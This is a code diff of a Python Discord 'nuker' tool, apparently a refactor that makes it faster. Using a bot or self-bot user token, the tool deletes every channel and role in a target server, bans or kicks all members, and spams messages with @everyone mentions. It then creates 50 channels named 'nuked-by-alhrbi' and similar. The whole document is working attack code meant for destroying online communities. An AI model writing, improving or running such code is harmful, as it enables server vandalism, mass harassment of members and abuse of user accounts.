@@ -13,24 +13,24 @@ YELLOW = Fore.YELLOW
 GREEN = Fore.GREEN
 RED = Fore.RED
 
-try:
-    intents = discord.Intents.all()
-except:
-    intents = None
+intents = discord.Intents.all()
+bot = None
+
+cancel_flag = False
 
 def check_cancel():
-    global cancel
-    return cancel
+    global cancel_flag
+    return cancel_flag
 
 def reset_cancel():
-    global cancel
-    cancel = False
+    global cancel_flag
+    cancel_flag = False
 
-async def wait_cancel():
-    global cancel
+async def wait_for_cancel():
+    global cancel_flag
     loop = asyncio.get_running_loop()
     await loop.run_in_executor(None, input, YELLOW + "\n[!] Press ENTER to cancel: ")
-    cancel = True
+    cancel_flag = True
 
 SPAM = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]
 NAMES = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]
@@ -254,285 +254,356 @@ def print_logo():
     print(YELLOW + "Owner : mayberayanalhrbi")
     print(YELLOW + "=" * 60)
 
-
-async def del_channel(ch):
+# ==================== FAST FUNCTIONS ====================
+async def fast_delete_channel(channel):
     try:
-        await ch.delete()
+        await channel.delete()
         return True
     except:
         return False
 
-async def del_role(r):
+async def fast_delete_role(role):
     try:
-        await r.delete()
+        await role.delete()
         return True
     except:
         return False
 
-async def ban_member(m):
+async def fast_ban(member):
     try:
-        await m.ban(reason="Tool", delete_message_days=0)
+        await member.ban(reason="Tool", delete_message_days=0)
         return True
     except:
         return False
 
-async def kick_member(m):
+async def fast_kick(member):
     try:
-        await m.kick(reason="Tool")
+        await member.kick(reason="Tool")
         return True
     except:
         return False
 
-async def create_ch(g, name):
+async def fast_create(guild, name):
     try:
-        return await g.create_text_channel(name=name)
+        return await guild.create_text_channel(name=name)
     except:
         return None
 
-async def rename_ch(ch, name):
+async def fast_rename_channel(channel, name):
     try:
-        await ch.edit(name=name)
+        await channel.edit(name=name)
         return True
     except:
         return False
 
-async def send_msg(ch, msg):
+async def fast_send(channel, msg):
     try:
-        await ch.send(msg)
+        await channel.send(msg + " @everyone")
         return True
     except:
         return False
 
+async def fast_send_no_mention(channel, msg):
+    try:
+        await channel.send(msg)
+        return True
+    except:
+        return False
 
-async def nuke_guild(g):
-    global cancel
-    reset_cancel()
-    
-    printc("[+] Deleting all channels...")
-    chs = list(g.channels)
-    if chs:
-        await asyncio.gather(*[del_channel(ch) for ch in chs], return_exceptions=True)
-    printc("[+] Channels deleted")
-    
-    printc("[+] Deleting all roles...")
-    roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
-    if roles:
-        await asyncio.gather(*[del_role(r) for r in roles], return_exceptions=True)
-    printc("[+] Roles deleted")
-    
-    printc("[+] Banning all members...")
-    members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
-    if members:
-        await asyncio.gather(*[ban_member(m) for m in members], return_exceptions=True)
-    printc("[+] Members banned")
-    
-    printc("[+] Creating new channels...")
-    channel_names = ["alhrbi", "nuked-by-alhrbi", "alhrbi-was-here", "maybe-alhrbi", "alhrbi-community"]
-    await asyncio.gather(*[create_ch(g, random.choice(channel_names)) for _ in range(50)], return_exceptions=True)
-    printc("[+] Channels created")
-    
-    reset_cancel()
-
-
-async def handle_delete_channels(g):
-    global cancel
+# ==================== FAST HANDLERS ====================
+async def handle_delete_channels(guild):
+    global cancel_flag
     reset_cancel()
     await show_art('1')
-    printc("[+] Deleting all channels...")
-    chs = list(g.channels)
-    if not chs:
+    
+    channels = list(guild.channels)
+    if not channels:
         printc("[X] No channels found")
         inp("Press Enter...")
         return
-    printc(f"[+] Found {len(chs)} channels")
-    await asyncio.gather(*[del_channel(ch) for ch in chs], return_exceptions=True)
-    printc("[+] All channels deleted")
+    
+    printc(f"[+] Deleting {len(channels)} channels...")
+    
+    tasks = [fast_delete_channel(ch) for ch in channels]
+    
+    cancel_task = asyncio.create_task(wait_for_cancel())
+    
+    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
+    
+    cancel_task.cancel()
+    reset_cancel()
+    
+    printc(f"[+] Deleted {len(done)} channels!")
     printc("[+] Press Enter to return")
     inp("")
 
-async def handle_delete_roles(g):
-    global cancel
+async def handle_delete_roles(guild):
+    global cancel_flag
     reset_cancel()
     await show_art('2')
-    printc("[+] Deleting all roles...")
-    roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
+    
+    roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
     if not roles:
         printc("[X] No roles found")
         inp("Press Enter...")
         return
-    printc(f"[+] Found {len(roles)} roles")
-    await asyncio.gather(*[del_role(r) for r in roles], return_exceptions=True)
-    printc("[+] All roles deleted")
+    
+    printc(f"[+] Deleting {len(roles)} roles...")
+    
+    tasks = [fast_delete_role(r) for r in roles]
+    
+    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
+    
+    printc(f"[+] Deleted {len(done)} roles!")
     printc("[+] Press Enter to return")
     inp("")
 
-async def handle_create_channels(g):
-    global cancel
+async def handle_create_channels(guild):
+    global cancel_flag
     reset_cancel()
     await show_art('3')
-    printc("[+] Creating channels...")
+    
     count = inp("[?] How many? : ").strip()
     if not count.isdigit():
         return
     count = int(count)
-    printc(f"[+] Creating {count} channels...")
-    await asyncio.gather(*[create_ch(g, random.choice(NAMES)) for _ in range(count)], return_exceptions=True)
-    printc(f"[+] Created {count} channels")
-    printc("[+] Press Enter to return")
-    inp("")
     
-async def handle_rename_channels(g):
-    global cancel
+    printc(f"[+] Creating {count} channels...")
+    
+    tasks = [fast_create(guild, random.choice(NAMES)) for _ in range(count)]
+    
+    cancel_task = asyncio.create_task(wait_for_cancel())
+    
+    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
+    
+    cancel_task.cancel()
     reset_cancel()
-    await show_art('4')
-    printc("[+] Renaming channels...")
-    chs = list(g.text_channels)
-    if not chs:
-        printc("[X] No channels found")
-        inp("Press Enter...")
-        return
-    printc(f"[+] Found {len(chs)} channels")
-    await asyncio.gather(*[rename_ch(ch, random.choice(NAMES)) for ch in chs], return_exceptions=True)
-    printc(f"[+] Renamed {len(chs)} channels")
+    
+    printc(f"[+] Created {len(done)} channels!")
     printc("[+] Press Enter to return")
     inp("")
 
-async def handle_rename_custom(g):
-    global cancel
+async def handle_rename_channels(guild):
+    global cancel_flag
     reset_cancel()
-    await show_art('5')
-    printc("[+] Renaming with custom names...")
-    chs = list(g.text_channels)
-    if not chs:
+    await show_art('4')
+    
+    channels = list(guild.text_channels)
+    if not channels:
         printc("[X] No channels found")
         inp("Press Enter...")
         return
+    
+    printc(f"[+] Renaming {len(channels)} channels...")
+    
+    tasks = [fast_rename_channel(ch, random.choice(NAMES)) for ch in channels]
+    
+    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
+    
+    printc(f"[+] Renamed {len(done)} channels!")
+    printc("[+] Press Enter to return")
+    inp("")
+
+async def handle_rename_custom(guild):
+    global cancel_flag
+    reset_cancel()
+    await show_art('5')
+    
+    channels = list(guild.text_channels)
+    if not channels:
+        printc("[X] No channels found")
+        inp("Press Enter...")
+        return
+    
     printc("[+] Enter names separated by dot (.)")
     printc("[+] Example: name1 . name2 . name3")
     print()
     names_in = inp("[?] Names: ").strip()
     if not names_in:
         return
+    
     names = [n.strip() for n in names_in.split('.') if n.strip()]
     if not names:
         printc("[X] No valid names")
         inp("Press Enter...")
         return
-    printc(f"[+] Using {len(names)} names")
-    printc(f"[+] Renaming {len(chs)} channels...")
-    await asyncio.gather(*[rename_ch(ch, names[i % len(names)]) for i, ch in enumerate(chs)], return_exceptions=True)
-    printc(f"[+] Renamed {len(chs)} channels")
+    
+    printc(f"[+] Renaming {len(channels)} channels...")
+    
+    tasks = [fast_rename_channel(ch, names[i % len(names)]) for i, ch in enumerate(channels)]
+    
+    done, pending = await asyncio.wait(tasks, timeout=30, return_when=asyncio.ALL_COMPLETED)
+    
+    printc(f"[+] Renamed {len(done)} channels!")
     printc("[+] Press Enter to return")
     inp("")
 
-async def handle_send_all(g):
-    global cancel
+async def handle_send_all(guild):
+    global cancel_flag
     reset_cancel()
     await show_art('6')
-    printc("[+] Sending messages...")
-    chs = [ch for ch in g.text_channels if ch.permissions_for(g.me).send_messages]
-    if not chs:
+    
+    channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
+    if not channels:
         printc("[X] No channels found")
         inp("Press Enter...")
         return
+    
     msg = inp("[?] Message: ").strip()
     if not msg:
         return
+    
     count = inp("[?] Per channel: ").strip()
     if not count.isdigit():
         return
     count = int(count)
+    
+    printc(f"[+] Sending {count * len(channels)} messages...")
+    
     tasks = []
-    for ch in chs:
+    for ch in channels:
         for _ in range(count):
-            tasks.append(send_msg(ch, msg))
-    await asyncio.gather(*tasks, return_exceptions=True)
-    printc(f"[+] Sent {len(tasks)} messages")
+            tasks.append(fast_send(ch, msg))
+    
+    cancel_task = asyncio.create_task(wait_for_cancel())
+    
+    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
+    
+    cancel_task.cancel()
+    reset_cancel()
+    
+    printc(f"[+] Sent {len(done)} messages!")
     printc("[+] Press Enter to return")
     inp("")
 
-async def handle_ban_all(g):
-    global cancel
+async def handle_ban_all(guild):
+    global cancel_flag
     reset_cancel()
     await show_art('7')
-    printc("[+] Banning all members...")
-    members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
+    
+    members = [m for m in guild.members if m != guild.me and m != guild.owner and m.top_role < guild.me.top_role]
     if not members:
         printc("[+] No members to ban")
         inp("Press Enter...")
         return
+    
     printc(f"[+] Banning {len(members)} members...")
-    await asyncio.gather(*[ban_member(m) for m in members], return_exceptions=True)
-    printc(f"[+] Banned {len(members)} members")
+    
+    tasks = [fast_ban(m) for m in members]
+    
+    cancel_task = asyncio.create_task(wait_for_cancel())
+    
+    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
+    
+    cancel_task.cancel()
+    reset_cancel()
+    
+    printc(f"[+] Banned {len(done)} members!")
     printc("[+] Press Enter to return")
     inp("")
 
-async def handle_kick_all(g):
-    global cancel
+async def handle_kick_all(guild):
+    global cancel_flag
     reset_cancel()
     await show_art('8')
-    printc("[+] Kicking all members...")
-    members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
+    
+    members = [m for m in guild.members if m != guild.me and m != guild.owner and m.top_role < guild.me.top_role]
     if not members:
         printc("[+] No members to kick")
         inp("Press Enter...")
         return
+    
     printc(f"[+] Kicking {len(members)} members...")
-    await asyncio.gather(*[kick_member(m) for m in members], return_exceptions=True)
-    printc(f"[+] Kicked {len(members)} members")
+    
+    tasks = [fast_kick(m) for m in members]
+    
+    cancel_task = asyncio.create_task(wait_for_cancel())
+    
+    done, pending = await asyncio.wait(tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
+    
+    cancel_task.cancel()
+    reset_cancel()
+    
+    printc(f"[+] Kicked {len(done)} members!")
     printc("[+] Press Enter to return")
     inp("")
 
-async def handle_nuke(g):
-    global cancel
+async def handle_nuke(guild):
+    global cancel_flag
     reset_cancel()
     await show_art('9')
+    
     confirm = inp("[!] Are you sure you want to NUKE this server? (y/n): ").strip().lower()
-    if confirm == 'y':
-        await nuke_guild(g)
-        printc("[+] Server Nuked Successfully!")
-    else:
+    if confirm != 'y':
         printc("[!] Nuke cancelled")
+        inp("Press Enter...")
+        return
+    
+    printc("[+] NUKE STARTED!")
+    
+    all_tasks = []
+    
+    all_tasks.extend([fast_delete_channel(ch) for ch in guild.channels])
+    
+    roles = [r for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
+    all_tasks.extend([fast_delete_role(r) for r in roles])
+    
+    members = [m for m in guild.members if m != guild.me and m != guild.owner and m.top_role < guild.me.top_role]
+    all_tasks.extend([fast_ban(m) for m in members])
+    
+    done, pending = await asyncio.wait(all_tasks, timeout=120, return_when=asyncio.ALL_COMPLETED)
+    
+    printc(f"[+] Nuke completed! {len(done)} actions done!")
+    
+    printc("[+] Creating new channels...")
+    channel_names = ["alhrbi", "nuked-by-alhrbi", "alhrbi-was-here", "maybe-alhrbi", "alhrbi-community"]
+    
+    create_tasks = [fast_create(guild, random.choice(channel_names)) for _ in range(50)]
+    done2, pending2 = await asyncio.wait(create_tasks, timeout=60, return_when=asyncio.ALL_COMPLETED)
+    
+    printc(f"[+] Created {len(done2)} new channels!")
+    printc("[+] Server NUKED Successfully!")
     printc("[+] Press Enter to return")
     inp("")
 
-async def main_menu(g):
+# ==================== MENU ====================
+async def main_menu(guild):
     while True:
         print_logo()
-        print(YELLOW + f"Connected Server: {g.name} (ID: {g.id})")
+        print(YELLOW + f"Connected Server: {guild.name} (ID: {guild.id})")
         print(YELLOW + "=" * 60)
-        print(YELLOW + "[1] Delete All Channels")
-        print(YELLOW + "[2] Delete All Roles")
-        print(YELLOW + "[3] Create Mass Channels")
-        print(YELLOW + "[4] Mass Rename Channels (Random)")
-        print(YELLOW + "[5] Mass Rename Channels (Custom)")
-        print(YELLOW + "[6] Mass Send Messages")
-        print(YELLOW + "[7] Ban All Members")
-        print(YELLOW + "[8] Kick All Members")
-        print(YELLOW + "[9] NUKE SERVER")
+        print(YELLOW + "[1] Delete All Channels (FAST)")
+        print(YELLOW + "[2] Delete All Roles (FAST)")
+        print(YELLOW + "[3] Create Mass Channels (FAST)")
+        print(YELLOW + "[4] Mass Rename Channels - Random (FAST)")
+        print(YELLOW + "[5] Mass Rename Channels - Custom (FAST)")
+        print(YELLOW + "[6] Mass Send Messages (FAST)")
+        print(YELLOW + "[7] Ban All Members (FAST)")
+        print(YELLOW + "[8] Kick All Members (FAST)")
+        print(YELLOW + "[9] NUKE SERVER (FAST)")
         print(YELLOW + "[0] Exit")
         print(YELLOW + "=" * 60)
 
         choice = inp("[?] Choice: ").strip().lower()
 
         if choice == '1':
-            await handle_delete_channels(g)
+            await handle_delete_channels(guild)
         elif choice == '2':
-            await handle_delete_roles(g)
+            await handle_delete_roles(guild)
         elif choice == '3':
-            await handle_create_channels(g)
+            await handle_create_channels(guild)
         elif choice == '4':
-            await handle_rename_channels(g)
+            await handle_rename_channels(guild)
         elif choice == '5':
-            await handle_rename_custom(g)
+            await handle_rename_custom(guild)
         elif choice == '6':
-            await handle_send_all(g)
+            await handle_send_all(guild)
         elif choice == '7':
-            await handle_ban_all(g)
+            await handle_ban_all(guild)
         elif choice == '8':
-            await handle_kick_all(g)
+            await handle_kick_all(guild)
         elif choice == '9':
-            await handle_nuke(g)
+            await handle_nuke(guild)
         elif choice == 'alhrbi':
             await show_art('alhrbi')
             inp("Press Enter...")
@@ -541,6 +612,7 @@ async def main_menu(g):
             await bot.close()
             sys.exit()
 
+# ==================== STARTUP ====================
 async def start():
     global bot
     while True:
@@ -548,53 +620,62 @@ async def start():
         token = inp("[+] Token: ").strip()
         if not token:
             continue
+        
         try:
             gid = int(inp("[+] Guild ID: ").strip())
         except ValueError:
             printc("[X] Invalid Guild ID!")
             continue
+        
         print()
         printc("1. Bot Token")
         printc("2. User Token (Self-Bot)")
         print()
         choice = inp("[?] Choose: ").strip()
+        
         try:
             if choice == "2":
                 bot = commands.Bot(command_prefix="!", self_bot=True, intents=intents)
+                
                 @bot.event
                 async def on_ready():
                     print_logo()
-                    g = bot.get_guild(gid)
-                    if g:
-                        printc(f"[+] Connected: {g.name}")
-                        await main_menu(g)
+                    guild = bot.get_guild(gid)
+                    if guild:
+                        printc(f"[+] Connected: {guild.name}")
+                        await main_menu(guild)
                     else:
                         printc("[X] Guild not found")
                         await bot.close()
+                
                 try:
                     await bot.start(token, bot=False)
                     break
                 except Exception as e:
                     printc(f"[X] Connection failed: {e}")
                     continue
+            
             else:
                 bot = commands.Bot(command_prefix="!", intents=intents)
+                
                 @bot.event
                 async def on_ready():
                     print_logo()
-                    g = bot.get_guild(gid)
-                    if g:
-                        printc(f"[+] Connected: {g.name}")
-                        await main_menu(g)
+                    guild = bot.get_guild(gid)
+                    if guild:
+                        printc(f"[+] Connected: {guild.name}")
+                        await main_menu(guild)
                     else:
                         printc("[X] Guild not found")
                         await bot.close()
+                
                 try:
                     await bot.start(token)
                     break
                 except Exception as e:
                     printc(f"[X] Connection failed: {e}")
                     continue
+        
         except Exception as e:
             printc(f"[X] Error: {e}")
             continue
